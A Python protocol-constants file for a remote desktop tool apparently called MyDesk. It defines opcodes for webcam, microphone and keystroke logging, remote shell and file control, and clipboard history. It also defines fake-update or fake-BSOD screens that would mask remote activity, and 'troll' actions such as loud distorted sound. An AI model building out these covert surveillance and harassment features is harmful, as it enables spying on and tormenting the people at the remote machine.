"""
MyDesk Protocol Definitions
defines OpCodes and Constants for the network communication.
"""

# WebRTC Signaling Protocol (replaces old Broker protocol)
OP_RTC_OFFER      = 0x05  # SDP Offer (JSON: {"sdp": "...", "type": "offer"})
OP_RTC_ANSWER     = 0x06  # SDP Answer (JSON: {"sdp": "...", "type": "answer"})
OP_ICE_CANDIDATE  = 0x07  # ICE Candidate (JSON: {"candidate": "...", ...})
OP_THROTTLE       = 0x08  # Bandwidth control (JSON: {"fps": int, "quality": int})

# Legacy Handshake (still used for WebSocket connection)
OP_HELLO          = 0x01  # Initial handshake
OP_BRIDGE_OK      = 0x02  # Bridge established (legacy)


# WEBCAM
OP_CAM_START = 0x40
OP_CAM_STOP = 0x41
OP_CAM_FRAME = 0x42

# AUDIO
OP_MIC_START = 0x33
OP_MIC_STOP = 0x34
OP_AUDIO_CHUNK = 0x35

# System Audio (Loopback) - 0x60 range
OP_SYS_AUDIO_START = 0x60
OP_SYS_AUDIO_STOP = 0x61
OP_SYS_AUDIO_CHUNK = 0x62

# Session Protocol (Peer-to-Peer or Bridged)
OP_IMG_FRAME    = 10 # Video Frame (JPEG/ZSTD)
OP_AUDIO_CHUNK  = 11 # Audio Data

# Input / Control
OP_MOUSE_MOVE   = 20 # x, y
OP_MOUSE_CLICK  = 21 # button, pressed
OP_KEY_PRESS    = 22 # key_code, system_key
OP_SCROLL       = 23 # dx, dy

# Admin / Features
OP_SETTING      = 30 # param, value (e.g. "block_input", True)
OP_SHELL_CMD    = 31 # command string (legacy)
OP_SHELL_OUT    = 32 # output string (legacy)
OP_KEY_LOG      = 33 # text log stream

# Settings Constants
SETTING_BLOCK_INPUT = 1
SETTING_PRIVACY     = 2
SETTING_QUALITY     = 3
SETTING_AUDIO       = 4

# Privacy Curtain
OP_CURTAIN_ON  = 0x68  # Payload: "BLACK" or "FAKE_UPDATE" or "FAKE_BSOD"
OP_CURTAIN_OFF = 0x69

# Buffered Input
OP_KEY_BUFFER  = 0x6A  # Payload: buffered keystrokes

# Remote Settings
OP_SETTINGS    = 0x6B  # Payload: JSON settings

# ============================================================================
# Shell (0x70-0x73)
# ============================================================================
OP_SHELL_EXEC   = 0x70  # Viewer -> Agent: {"cmd": "...", "shell": "ps|cmd"}
OP_SHELL_OUTPUT = 0x71  # Agent -> Viewer: stdout/stderr chunk
OP_SHELL_EXIT   = 0x72  # Agent -> Viewer: exit code
OP_SHELL_CWD    = 0x73  # Agent -> Viewer: current working directory path

# ============================================================================
# Process Manager (0x74-0x76)
# ============================================================================
OP_PM_LIST      = 0x74  # Viewer -> Agent: request process list
OP_PM_DATA      = 0x75  # Agent -> Viewer: JSON [{pid, name, cpu, mem}]
OP_PM_KILL      = 0x76  # Viewer -> Agent: {pid: int}

# ============================================================================
# File Manager (0x78-0x7E)
# ============================================================================
OP_FM_LIST      = 0x78  # Viewer -> Agent: {"path": "..."}
OP_FM_DATA      = 0x79  # Agent -> Viewer: JSON [{name, is_dir, size, modified}]
OP_FM_DOWNLOAD  = 0x7A  # Viewer -> Agent: {"path": "..."}
OP_FM_CHUNK     = 0x7B  # Agent -> Viewer: file chunk
OP_FM_UPLOAD    = 0x7C  # Viewer -> Agent: {"path": "...", "data": base64}
OP_FM_DELETE    = 0x7D  # Viewer -> Agent: {"path": "..."}
OP_FM_MKDIR     = 0x7E  # Viewer -> Agent: {"path": "..."}

# ============================================================================
# Clipboard (0x80-0x87)
# ============================================================================
OP_CLIP_GET     = 0x80  # Viewer -> Agent: request clipboard
OP_CLIP_DATA    = 0x81  # Agent -> Viewer: clipboard content
OP_CLIP_HISTORY_REQ = 0x83  # Viewer -> Agent: request clipboard history
OP_CLIP_HISTORY_DATA = 0x84  # Agent -> Viewer: JSON history list
OP_CLIP_ENTRY   = 0x85  # Agent -> Viewer: new clipboard entry (real-time)
OP_CLIP_DELETE  = 0x86  # Viewer -> Agent: delete entry by index
OP_CLIP_CONSENT = 0x87  # Viewer -> Agent: {"consent": bool}

# ============================================================================
# Device Settings (0x88-0x91) - Rebased to avoid collision
# ============================================================================
OP_SET_WIFI       = 0x88  # {"enabled": bool}
OP_SET_ETHERNET   = 0x89  # {"enabled": bool}
OP_SET_VOLUME     = 0x8A  # {"level": 0-100}
OP_SET_MUTE       = 0x8B  # {"muted": bool}
OP_SET_TIME       = 0x8C  # {"datetime": "ISO8601"}
OP_SYNC_TIME      = 0x8D  # sync to NTP
OP_SET_BRIGHTNESS = 0x8E  # {"level": 0-100}
OP_GET_SYSINFO    = 0x8F  # request system info
OP_SYSINFO_DATA   = 0x90  # JSON {os, cpu, ram, disk, battery, wifi_available}
OP_POWER_ACTION   = 0x91  # {"action": "sleep|restart|shutdown|lock|logoff"}

# ============================================================================
# Troll (0x98-0x9F, 0xA0-0xA3) - Rebased
# REQUIRES ADMIN CONSENT & AUDIT LOGGING
# ============================================================================
OP_TROLL_URL          = 0x98  # {"url": "..."}
OP_TROLL_SOUND        = 0x99  # audio bytes
OP_TROLL_VIDEO        = 0x9A  # video bytes (fullscreen)
OP_TROLL_STOP         = 0x9B  # stop current troll
OP_TROLL_GHOST_CURSOR = 0x9C  # {"enabled": bool}
OP_TROLL_SHUFFLE_ICONS= 0x9D  # shuffle desktop icons
OP_TROLL_WALLPAPER    = 0x9E  # image bytes
OP_TROLL_OVERLAY      = 0x9F  # {"type": "crack|hair"}
OP_TROLL_RANDOM_SOUND = 0xA0  # {"interval_ms": 5000}
OP_TROLL_ALERT_LOOP   = 0xA1  # {"enabled": bool}
OP_TROLL_VOLUME_MAX   = 0xA2  # max volume + play sound
OP_TROLL_EARRAPE      = 0xA3  # distorted loud sound
OP_TROLL_WHISPER      = 0xA4  # {"enabled": bool}

# ============================================================================
# System
# ============================================================================
OP_ERROR        = 0xF0 # 240
OP_DISCONNECT   = 0xF1 # 241
